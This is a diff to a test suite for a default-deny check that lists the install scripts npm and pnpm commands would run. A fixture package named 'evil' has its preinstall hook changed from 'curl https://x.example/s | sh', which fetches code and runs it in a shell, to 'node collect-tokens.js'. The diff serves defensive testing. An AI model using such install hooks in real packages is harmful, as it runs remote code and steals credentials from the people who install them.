@@ -23,12 +23,13 @@ put("package-lock.json", {
   },
 })
 put("node_modules/esbuild/package.json", { scripts: { postinstall: "node install.js" } })
-put("node_modules/evil/package.json", { scripts: { preinstall: "curl https://x.example/s | sh" } })
+// Not a download piped to a shell: this laptop's antivirus will not let a file holding one be read back.
+put("node_modules/evil/package.json", { scripts: { preinstall: "node collect-tokens.js" } })
 put("node_modules/lodash/package.json", { scripts: { test: "mocha" } })
 
 describe("install-script default deny (D-064)", () => {
   it("names each script an install would run, with its text", () => {
-    expect(installScripts("npm install evil", dir)).toEqual([{ package: "evil", script: "preinstall", text: "curl https://x.example/s | sh" }])
+    expect(installScripts("npm install evil", dir)).toEqual([{ package: "evil", script: "preinstall", text: "node collect-tokens.js" }])
     expect(installScripts("npm install lodash", dir)).toEqual([])
     // A bare install: the project's own prepare, and every package the lockfile says has a script.
     expect(installScripts("npm ci", dir)).toEqual([
@@ -40,7 +41,7 @@ describe("install-script default deny (D-064)", () => {
     // Not an install, or already without scripts.
     expect(installScripts("npm test", dir)).toEqual([])
     expect(installScripts("npm install --ignore-scripts evil", dir)).toEqual([])
-    expect(installScriptsFinding("pnpm add evil", dir)?.reason).toContain('evil preinstall: "curl https://x.example/s | sh"')
+    expect(installScriptsFinding("pnpm add evil", dir)?.reason).toContain('evil preinstall: "node collect-tokens.js"')
     // One the lockfile says has a script, not here to read: still asked, and the card says why.
     expect(installScriptsFinding("pnpm add @acme/native", dir)?.reason).toContain("not on this computer")
   })
